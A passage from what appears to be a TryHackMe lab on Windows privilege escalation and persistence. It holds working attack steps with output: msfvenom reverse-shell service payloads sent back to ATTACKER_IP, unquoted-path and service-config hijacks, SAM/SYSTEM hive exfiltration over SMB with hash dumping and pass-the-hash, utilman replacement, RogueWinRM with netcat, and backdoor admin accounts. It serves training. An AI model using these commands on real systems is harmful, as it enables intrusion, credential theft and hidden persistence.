C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

And here we have something interesting. The Everyone group has modify
 permissions (M) on the service's executable. This means we can simply 
overwrite it with any payload of our preference, and the service will 
execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:

Kali Linux

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exeuser@attackerpc$ python3 -m http.serverServingHTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

We can then pull the payload from Powershell with the following command:

Powershell

```
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
```

Once the payload is in the Windows server, we proceed to replace the 
service executable with our payload. Since we need another user to 
execute our payload, we'll want to grant full permissions to the 
Everyone group as well:

Command Prompt

```
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
```

We start a reverse listener on our attacker machine:

Kali Linux

```
user@attackerpc$ nc -lvp 4445
```

And finally, restart the service. While in a normal scenario, you 
would likely have to wait for a service restart, you have been assigned 
privileges to restart the service yourself to save you some time. Use 
the following commands from a cmd.exe command prompt:

Command Prompt

```
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```

**Note:** PowerShell has `sc` as an alias to `Set-Content`, therefore you need to use `sc.exe` in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:

Kali Linux

```
user@attackerpc$ nc -lvp 4445Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1
```

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

## Unquoted Service Paths

When we can't directly write into service executables as before, 
there might still be a chance to force a service into running arbitrary 
executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour 
occurs when the service is configured to point to an "unquoted" 
executable. By unquoted, we mean that the path of the associated 
executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services 
(these services are used as examples only and might not be available in 
your machine). The first service will use a proper quotation so that the
 SCM knows without a doubt that it has to execute the binary file 
pointed by `"C:\Program Files\RealVNC\VNC Server\vncserver.exe"`, followed by the given parameters:

Command Prompt

```
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

**Remember: PowerShell
 has 'sc' as an alias to 'Set-Content', therefore you need to use 
'sc.exe' to control services if you are in a PowerShell prompt.**

Now let's look at another service without proper quotation:

Command Prompt

```
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
```

When the SCM tries to execute the associated binary, a problem 
arises. Since there are spaces on the name of the "Disk Sorter 
Enterprise" folder, the command becomes ambiguous, and the SCM doesn't 
know which of the following you are trying to execute:

| Command | Argument 1 | Argument 2 |
| --- | --- | --- |
| C:\MyPrograms\Disk.exe | Sorter | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe |  |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |  |  |

This has to do with how the command prompt parses a command. Usually,
 when you send a command, spaces are used as argument separators unless 
they are part of a quoted string. This means the "right" interpretation 
of the unquoted command would be to execute `C:\\MyPrograms\\Disk.exe` and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user 
and starts searching for each of the binaries in the order shown in the 
table:

1. First, search for `C:\\MyPrograms\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker 
creates any of the executables that are searched for before the expected
 service executable, they can force the service to run an arbitrary 
executable.

While this sounds trivial, most of the service executables will be installed under `C:\Program Files` or `C:\Program Files (x86)`
 by default, which isn't writable by unprivileged users. This prevents 
any vulnerable service from being exploited. There are exceptions to 
this rule: - Some installers change the permissions on the installed 
folders, making the services vulnerable. - An administrator might decide
 to install the service binaries in a non-default path. If such a path 
is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under `c:\MyPrograms`. By default, this inherits the permissions of the `C:\` directory, which allows any user to create files and folders in it. We can check this using `icacls`:

Command Prompt

```
C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

The `BUILTIN\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and 
transferring it to the target host is the same as before, so feel free 
to create the following payload and upload it to the server as before. 
We will also start a listener to receive the reverse shell when it gets 
executed:

Kali Linux

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exeuser@attackerpc$ nc -lvp 4446
```

Once the payload is in the server, move it to any of the locations 
where hijacking might occur. In this case, we will be moving our payload
 to `C:\MyPrograms\Disk.exe`. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:

Command Prompt

```
C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.
```

Once the service gets restarted, your payload should execute:

Command Prompt

```
C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

As a result, you'll get a reverse shell with svcusr2 privileges:

Kali Linux

```
user@attackerpc$ nc -lvp 4446Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2
```

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.

## Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL
 is well configured, and the service's binary path is rightly quoted. 
Should the service DACL (not the service's executable DACL) allow you to
 modify the configuration of a service, you will be able to reconfigure 
the service. This will allow you to point to any executable you need and
 run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. For your convenience, a copy is available at `C:\\tools`. The command to check for the thmservice service DACL is:

Command Prompt

```
C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the `BUILTIN\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse 
shell and start a listener for it on the attacker's machine:

Kali Linux

```
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exeuser@attackerpc$ nc -lvp 4447
```

We will then transfer the reverse shell executable to the target machine and store it in `C:\Users\thm-unpriv\rev-svc3.exe`.
 Feel free to use wget to transfer your executable and move it to the 
desired location. Remember to grant permissions to Everyone to execute 
your payload:

Command Prompt

```
C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
```

To change the service's associated executable and account, we can use
 the following command (mind the spaces after the equal signs when using
 sc.exe):

Command Prompt

```
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
```

Notice we can use any account to run the service. We chose 
LocalSystem as it is the highest privileged account available. To 
trigger our payload, all that rests is restarting the service:

Command Prompt

```
C:\> sc stop THMService
C:\> sc start THMService
```

And we will receive a shell back in our attacker's machine with SYSTEM privileges:

Kali Linux

```
user@attackerpc$ nc -lvp 4447Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

**Abusing dangerous privileges**

## Windows Privileges

Privileges are rights that an account has to perform specific 
system-related tasks. These tasks can be as simple as the privilege to 
shut down the machine up to privileges to bypass some DACL-based access 
controls.

Each user has a set of assigned privileges that can be checked with the following command:

```
whoami /priv
```

A complete list of available privileges on Windows systems is available [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
 From an attacker's standpoint, only those privileges that allow us to 
escalate in the system are of interest. You can find a comprehensive 
list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.

## SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL
 in place. The idea behind this privilege is to allow certain users to 
perform backups from a system without requiring full administrative 
privileges.

Having this power, an attacker can trivially escalate privileges on 
the system by using many techniques. The one we will look at consists of
 copying the SAM and SYSTEM registry hives to extract the local 
Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

**User:** `THMBackup`

**Password:** `CopyMaster555`

This account is part of the "Backup Operators" group, which by 
default is granted the SeBackup and SeRestore privileges. We will need 
to open a command prompt using the "Open as administrator" option to use
 these privileges. We will be asked to input our password again to get 
an elevated console:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/befb434f15dbd4deee0654f8b6ef6de0.png)

Once on the command prompt, we can check our privileges with the following command:

Command Prompt

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:

Command Prompt

```
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:

Kali Linux

```
user@attackerpc$ mkdir shareuser@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

This will create a share named `public` pointing to the `share` directory, which requires the username and password of our current windows session. After this, we can use the `copy` command in our windows machine to transfer both files to our AttackBox:

Command Prompt

```
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

```

And use impacket to retrieve the users' password hashes:

Kali Linux

```
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCALImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

We can finally use the Administrator's hash to perform a 
Pass-the-Hash attack and gain access to the target machine with SYSTEM 
privileges:

Kali Linux

```
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IPImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any 
object on the system, including files and registry keys, opening up many
 possibilities for an attacker to elevate privileges, as we could, for 
example, search for a service running as SYSTEM and take ownership of 
the service's executable. For this task, we will be taking a different 
route, however.

Log in to the target machine via RDP using the following credentials:

**User:** `THMTakeOwnership`

**Password:** `TheWorldIsMine2022`

To get the SeTakeOwnership privilege, we need to open a command 
prompt using the "Open as administrator" option. We will be asked to 
input our password to get an elevated console:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/33303d0cde736589d2838ee894379ff2.png)

Once on the command prompt, we can check our privileges with the following command:

Command Prompt

```
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

We'll abuse `utilman.exe` to escalate privileges this 
time. Utilman is a built-in Windows application used to provide Ease of 
Access options during the lock screen:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)

Since Utilman is run with SYSTEM privileges, we will effectively gain
 SYSTEM privileges if we replace the original binary for any payload we 
like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:

Command Prompt

```
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Notice that being the owner of a file doesn't necessarily mean that 
you have privileges over it, but being the owner you can assign yourself
 any privileges you need. To give your user full permissions over 
utilman.exe you can use the following command:

Command Prompt

```
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

After this, we will replace utilman.exe with a copy of cmd.exe:

Command Prompt

```
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

To trigger utilman, we will lock our screen from the start button:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dd7290ca93369cee33182023cb9190ff.png)

And finally, proceed to click on the "Ease of Access" button, which 
runs utilman.exe with SYSTEM privileges. Since we replaced it with a 
cmd.exe copy, we will get a command prompt with SYSTEM privileges:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1401bc3dcb1e4eb84f526b95567a5ef8.png)

## SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act 
on their behalf. Impersonation usually consists of being able to spawn a
 process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user `ftp`. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/6e5768172fbb97d6777dde7e15a3fcfc.png)

There are several reasons why using ftp's token is not the best idea:
 - For the files to be served correctly, they would need to be 
accessible to the `ftp` user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user `ftp`.
 This adds complexity as we must manually configure specific permissions
 for each served file/directory. - For the operating system, all files 
are accessed by user `ftp`, independent of which user is currently logged in to the FTP
 service. This makes it impossible to delegate the authorisation to the 
operating system; therefore, the FTP service must implement it. - If the
 FTP service were compromised at some point, the attacker would 
immediately gain access to all of the folders to which the `ftp` user has access.

If, on the other hand, the FTP
 service's user has the SeImpersonate or SeAssignPrimaryToken privilege,
 all of this is simplified a bit, as the FTP service can temporarily 
grab the access token of the user logging in and use it to perform any 
task on their behalf:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/89e74e14454edc10fa2bd541ac359772.png)

Now, if user Ann logs in to the FTP
 service and given that the ftp user has impersonation privileges, it 
can borrow Ann's access token and use it to access her files. This way, 
the files don't need to provide access to user `ftp` in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with 
SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any
 user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK 
SERVICE ACCOUNTS already have such privileges. Since these accounts are 
used to spawn services using restricted accounts, it makes sense to 
allow them to impersonate connecting users if the service needs. 
Internet Information Services (IIS) will also create a similar default 
account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the 
following: 1. To spawn a process so that users can connect and 
authenticate to it for impersonation to occur. 2. Find a way to force 
privileged users to connect and authenticate to the spawned malicious 
process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running
 on IIS and that we have planted a web shell on the following address:

`http://MACHINE_IP/`

We can use the web shell to check for the assigned privileges of the 
compromised account and confirm we hold both privileges of interest for 
this task:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)

To use RogueWinRM, we first need to upload the exploit to the target 
machine. For your convenience, this has already been done, and you can 
find the exploit in the `C:\tools\` folder.

The RogueWinRM exploit is possible because whenever a user 
(including unprivileged users) starts the BITS service in Windows, it 
automatically creates a connection to port 5985 using SYSTEM privileges.
 Port 5985 is typically used for the WinRM service, which is simply a 
port that exposes a Powershell console to be used remotely through the 
network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim 
server, an attacker can start a fake WinRM service on port 5985 and 
catch the authentication attempt made by the BITS service when starting.
 If the attacker has SeImpersonate privileges, he can execute any 
command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:

Kali Linux

```
user@attackerpc$ nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)

**Note:** The exploit may take up to 2 minutes to work, 
so your browser may appear as unresponsive for a bit. This happens if 
you run the exploit multiple times as it must wait for the BITS service 
to stop before starting it again. The BITS service will stop 
automatically after 2 minutes of starting.

The `-p` parameter specifies the executable to be run by the exploit, which is `nc64.exe` in this case. The `-a`
 parameter is used to pass arguments to the executable. Since we want 
nc64 to establish a reverse shell against our attacker machine, the 
arguments to pass to netcat will be `-e cmd.exe ATTACKER_IP 4442`.

If all was correctly set up, you should expect a shell with SYSTEM privileges:

Kali Linux

```
user@attackerpc$ nc -lvp 4442Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

**Tools of the Trade**

Several scripts exist to conduct system enumeration in ways similar
to the ones seen in the previous task. These tools can shorten the
enumeration process time and uncover different potential privilege
escalation vectors. However, please remember that automated tools can
sometimes miss privilege escalation.

Below are a few tools commonly used to identify privilege escalation 
vectors. Feel free to run them against any of the machines in this room 
and see if the results match the discussed attack vectors.

## WinPEAS

WinPEAS is a script developed to enumerate the target system to 
uncover privilege escalation paths. You can find more information about 
winPEAS and download either the precompiled executable or a .bat script.
 WinPEAS will run commands similar to the ones listed in the previous 
task and print their output. The output from winPEAS can be lengthy and 
sometimes difficult to read. This is why it would be good practice to 
always redirect the output to a file, as shown below:

Command Prompt

```
C:\> winpeas.exe > outputfile.txt
```

WinPEAS can be downloaded [here](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

## PrivescCheck

PrivescCheck is a PowerShell
 script that searches common privilege escalation on the target system. 
It provides an alternative to WinPEAS without requiring the execution of
 a binary file.

PrivescCheck can be downloaded [here](https://github.com/itm4n/PrivescCheck).

**Reminder**:
 To run PrivescCheck on the target system, you may need to bypass the 
execution policy restrictions. To achieve this, you can use the `Set-ExecutionPolicy` cmdlet as shown below.

Powershell

```
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck
```

## WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to 
upload them to the target system and run them there. This may cause 
antivirus software to detect and delete them. To avoid making 
unnecessary noise that can attract attention, you may prefer to use 
WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe
 AttackBox).

WES-NG is a Python script that can be found and downloaded [here](https://github.com/bitsadmin/wesng).

Once installed, and before using it, type the  `wes.py --update`
 command to update the database. The script will refer to the database 
it creates to check for missing patches that can result in a 
vulnerability you can use to elevate your privileges on the target 
system.

To use the script, you will need to run the `systeminfo` command
 on the target system. Do not forget to direct the output to a .txt file
 you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;

Kali Linux

```
user@kali$ wes.py systeminfo.txt
```

## Metasploit

If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

### **WINDOWS LOCAL PERSISTENCE**

**Tampering With Unprivileged Accounts**

Having an administrator's 
credential would be the easiest way to achieve persistence in a machine.
 However, to make it harder for the blue team to detect us, we can 
manipulate unprivileged users, which usually won't be monitored as much 
as administrators, and grant them administrative privileges somehow.

Click the **Start Machine** button on this task before continuing. The machine will be available on your web browser, but if you prefer connecting via RDP, you can use the following credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

| **Username** | Administrator |
| --- | --- |
| **Password** | Password321 |

**Note:** When you log in via RDP,
 the existing in-browser view will be disconnected. After you terminate 
your RDP session you can get the in-browser view back by pressing **Reconnect**.

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

# Assign Group Memberships

For this part of the task, we will assume you have dumped the 
password hashes of the victim machine and successfully cracked the 
passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group. We can easily achieve this with the following command:

Command Prompt

```
C:\> net localgroup administrators thmuser0 /add
```

This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If this looks too suspicious, you can use the **Backup Operators**
 group. Users in this group won't have administrative privileges but 
will be allowed to read/write any file or registry key on the system, 
ignoring any configured DACL.
 This would allow us to copy the content of the SAM and SYSTEM registry 
hives, which we can then use to recover the password hashes for all the 
users, enabling us to escalate to any administrative account trivially.

To do so, we begin by adding the account to the Backup Operators group:

Command Prompt

```
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. We'll use WinRM for this task:

Command Prompt

```
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

We'll assume we have already dumped the credentials on the server and
 have thmuser1's password. Let's connect via WinRM using its 
credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

| **Username** | thmuser1 |
| --- | --- |
| **Password** | Password321 |

If you tried to connect right now from your attacker machine, you'd 
be surprised to see that even if you are on the Backups Operators group,
 you wouldn't be able to access all files as expected. A quick check on 
our assigned groups would indicate that we are a part of Backup 
Operators, but the group is disabled:

AttackBox

```
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**,
 strips any local account of its administrative privileges when logging 
in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll 
have to disable LocalAccountTokenFilterPolicy by changing the following 
registry key to 1:

Command Prompt

```
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Once all of this has been set up, we are ready to use our backdoor 
user. First, let's establish a WinRM connection and check that the 
Backup Operators group is enabled for our user:

AttackBox

```
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
